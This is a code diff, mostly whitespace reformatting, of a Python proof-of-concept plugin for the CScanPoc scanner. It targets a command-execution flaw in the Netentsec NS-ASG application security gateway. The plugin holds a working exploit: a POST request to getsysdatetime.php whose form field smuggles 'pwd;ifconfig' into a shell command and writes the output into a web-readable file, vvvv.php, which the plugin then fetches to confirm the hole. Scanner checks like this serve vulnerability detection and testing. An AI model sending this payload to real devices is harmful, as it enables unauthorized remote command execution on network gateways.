@@ -2,13 +2,15 @@
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import re, urlparse
+import re
+import urlparse
+
 
 class Vuln(ABVuln):
     vuln_id = 'Netentsec_0024'  # 平台漏洞编号，留空
     name = '网康NS-ASG 命令执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         网康 NS-ASG 应用安全网关命令执行漏洞：
@@ -19,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '网康应用安全网关'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '941820e0-d499-4bfa-a929-9658eeafbe6e'
@@ -37,11 +40,11 @@ class Poc(ABPoc):
             arg = self.target
             url1 = arg + '/protocol/iscdevicestatus/getsysdatetime.php'
             postdata = "procotalarray[messagecontent]=pwd;ifconfig>/Isc/third-party/httpd/htdocs/vvvv.php;+456"
-            code, head, res, errcode, _ = hh.http(url1,post=postdata)
+            code, head, res, errcode, _ = hh.http(url1, post=postdata)
             url2 = arg + '/vvvv.php'
             code, head, res, errcode, _ = hh.http(url2)
 
-            if code==200 and 'Ethernet  HWaddr' in res and 'Mask' in res:
+            if code == 200 and 'Ethernet  HWaddr' in res and 'Mask' in res:
                 #security_hole("Command Execution:%s"%url1)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -51,6 +54,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
